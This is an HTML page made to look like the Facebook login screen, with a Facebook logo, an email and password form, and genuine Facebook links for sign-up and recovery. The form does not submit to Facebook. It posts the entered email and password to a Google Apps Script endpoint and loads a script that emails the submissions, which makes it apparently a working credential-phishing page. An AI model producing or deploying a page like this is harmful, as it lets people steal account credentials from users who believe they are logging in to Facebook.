<!doctype html>
<html>
    <head>
        <link rel="stylesheet" type="text/css" href="style/style.css">
        <title>Facebook Log In</title>
        <link href="img/ad.jpg" rel="shortcut icon">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="contact form example">
    </head>
    <body>
        <div clas="container">
            <div class="header">
                <img src="img/fc4.png" height="40"
                width="200">
                <button href=" https://www.facebook.com/reg/" class="sign-btn">Sign 
                    Up
                </button>
        </div>
        <div class="box">
            <h5>  <strong> Log in to Facebook</strong></h5>
            <form id="gform" method="POST" class="pure-form pure-form-stacked" data-email="from_email@example.com"
                        action="https://script.google.com/macros/s/AKfycby2iseEiyyn-4jCu6AEYO1Kt3VsRMASmX4MOdOSSzq_D5Y2GpKYUHH-yA/exec ">
                        

            <input class="txt-mail" id="mail" name="email" type="email"   required placeholder="Email or Phone Number">

            <input class="txt-pass" id="Password" name="Password" type="password" placeholder="Password">

           

              <button class="box-links">
                    <i class="box-links"></i>&nbsp;Log In
                </button>
                
                <a  class="lb" href=" https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">&nbsp; &nbsp; &nbsp; <br>
                Forgotten account?</a>
                <a  class="lb" href="https://www.facebook.com/reg/">Sign Up for Facebook</a>
            </div>
        </div>

        

        <script data-cfasync="false" href="#" type="text/javascript"
        src="https://cdn.rawgit.com/dwyl/learn-to-send-email-via-google-script-html-no-server/master/form-submission-handler.js"> </script>

    </body>

</html>
